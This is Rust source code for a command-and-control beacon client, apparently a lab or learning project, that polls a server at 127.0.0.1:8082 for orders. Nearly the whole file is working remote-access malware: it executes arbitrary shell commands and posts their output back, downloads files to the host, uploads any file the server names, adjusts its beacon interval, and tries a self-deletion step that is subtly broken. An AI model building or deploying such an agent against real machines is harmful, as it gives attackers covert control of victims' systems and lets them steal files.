use std::{
    io::{Result, Cursor},
    thread,
    time::Duration,
    process::{Command, Output},
    str,
    env
};
use reqwest::{header::CONTENT_TYPE};
use serde::{Serialize, Deserialize};
use bytes::Bytes;

/// Request type sent to the client
#[derive(Serialize, Deserialize, Debug)]
enum OrdreType {
    Commande,
    Fichier,
    GetFichier,
    Vitesse,
    Autre
}

/// Request sent to the client
#[derive(Serialize, Deserialize, Debug)]
struct Ordre {
    ordre: OrdreType,
    arguments: Vec<String>,
}

/// Function to execute shell command with args and return the Result
fn exec_commande_shell(command: String, args: Vec<String>) -> Result<Command> {
    let mut base_command = Command::new(command);
    if args.len() > 0 {
        for i in 0..args.len() {
            base_command.arg(args[i].clone());
        }
    }
    base_command.status().expect("An error occured executing the command");
    return Ok(base_command);      
}

/// Main function that send GET request to the server and process the result when the server responds
#[tokio::main]
async fn sending_request(t: u64) -> Option<u64> {
    let client = reqwest::Client::builder()
        .build().unwrap();
    let response = client.get("http://127.0.0.1:8082")
        .body(String::from("Waiting for instructions"))
        .send()
        .await;
    match response{
        Ok(v) => {
            match v.status() {
                reqwest::StatusCode::OK => {
                    println!("Success!");

                    // Deserialize the body content
                    let texte : String = v.text().await.unwrap();
                    let contenu : std::result::Result<Ordre, serde_json::Error> = serde_json::from_str(&texte);

                    match contenu {
                       Ok(v) => {

                            // Execute different processes according to the command sent 
                            match v.ordre {
                                // Execute a shell command and return the output 
                                OrdreType::Commande => {
                                    let command_args = v.arguments[1..].to_vec();
                                    let command_name = v.arguments.get(0).unwrap().clone();
                                    
                                    let result_command = exec_commande_shell(command_name, command_args);

                                    match result_command{
                                        Ok(mut v) => sending_request_with_result(v.output().expect("error")).await.unwrap(),
                                        Err(_) => println!("error")
                                    };
                                },

                                // Send a file from the server to the client via POST response
                                OrdreType::Fichier => {
                                    let filename = v.arguments[0].clone();
                                    let mut file = std::fs::File::create(filename).unwrap();
                                    
                                    let content = send_file_post_request().await;

                                    match content {
                                        Ok(v) => {
                                            let mut content = Cursor::new(v);
                                            std::io::copy(&mut content, &mut file).unwrap();
                                        },
                                        Err(_) => {
                                            panic!("Cannot receive file content !")
                                        }
                                    }
                                },

                                // Send a file from the client to the server via POST request
                                OrdreType::GetFichier => {
                                    let filename = v.arguments[0].as_str();
                                    get_file(filename).await;
                                }

                                // Send a new sleep value for main client loop
                                OrdreType::Vitesse => {
                                    let new_vitesse = v.arguments[0].parse::<u64>().unwrap();
                                    return Some(new_vitesse);
                                },
                                _ => {
                                    println!("Not implemented order");
                                }
                            }

                       },
                       Err(_) => {
                            println!("Order reading error");
                       }
                    }

                },
                reqwest::StatusCode::REQUEST_TIMEOUT => {
                    println!("Request Timeout");
                },
                e => {
                    panic!("Uh oh! Something unexpected happened.   :   {:?}", e);
                }
            };
        },
        Err(_err) => println!("No connection")
    };

    // Wake up or asleep the beacon by modifing the frequency at which the request are sent
    thread::sleep(Duration::from_millis(t));
    return None;
}


/// Send a file to the server via POST request 
async fn get_file(filename: &str) -> () {
    let client = reqwest::Client::new();
    let file = std::fs::read(filename).unwrap();

    let response = client.post("http://127.0.0.1:8082")
        .header(CONTENT_TYPE, "multipart/form-data")
        .body(file)
        .send()
        .await;

    match response{
        Ok(v) => {
            match v.status() {
                reqwest::StatusCode::OK => {
                    println!("{}", v.text().await.unwrap());
                },
                _ => {
                    panic!("Uh oh! Something unexpected happened.");
                }
            };
        },
        Err(_err) => ()
    };
}


/// Send a POST request to the server for it to respond with a file, then return the file
async fn send_file_post_request() -> std::result::Result<Bytes, reqwest::Error> {
    let client = reqwest::Client::new();
    let response = client.post("http://127.0.0.1:8082")
        .send()
        .await;

    match response{
        Ok(v) => {
            match v.status() {
                reqwest::StatusCode::OK => {
                    println!("File : Success!");

                    let bytes = v.bytes().await.unwrap();
                    return Ok(bytes);

                },
                _ => {
                    panic!("Uh oh! Something unexpected happened.");
                }
            };
        },
        Err(e) => return Err(e)
    };
}


/// Send a POST request containing a shell command output
async fn sending_request_with_result(result_command: Output) -> Result<()> {
    let client = reqwest::Client::new();
    let response = client.post("http://127.0.0.1:8082/")
        .body(String::from_utf8(result_command.stdout).unwrap()) 
        .send()
        .await;

    match response{
        Ok(v) => {
            match v.status() {
                reqwest::StatusCode::OK => {
                    println!("Success!");
                    println!("{}", v.text().await.unwrap());
                },
                reqwest::StatusCode::UNAUTHORIZED => {
                    println!("Need to grab a new token");
                },
                _ => {
                    panic!("Uh oh! Something unexpected happened.");
                }
            };
        },
        Err(_err) => ()
    };
    return Ok(());
}


/// Get the current path and delete client part by moving it into /dev/NULL
fn autodestroy(){
    let path = env::current_dir();
    match path {
        Ok(v) => {
            println!("{}", v.display());
        },
        _ => {
            println!("An error occured catching the current path");
        }
    }
    exec_commande_shell("mv".to_string(), vec!["".to_string(), "/dev/NULL".to_string()]).unwrap();
}

/// Launch client side
fn main() {
    // Initialize the default frequency at which the request are sent
    let mut delay_in_sec: f64 = 5.0; 
    let mut number_of_request_without_response = 0;

    // Main loop that send GET request to the server
    while number_of_request_without_response < 1000000 {
        let result = sending_request((delay_in_sec*(1000 as f64)) as u64);
        match result {
            Some (new_time) =>  {
                delay_in_sec = new_time as f64;
                number_of_request_without_response = 0;
            },
            None => {
                number_of_request_without_response = number_of_request_without_response + 1;
            }
        }
    }

    // finally autodestroy the beacon
    autodestroy();
}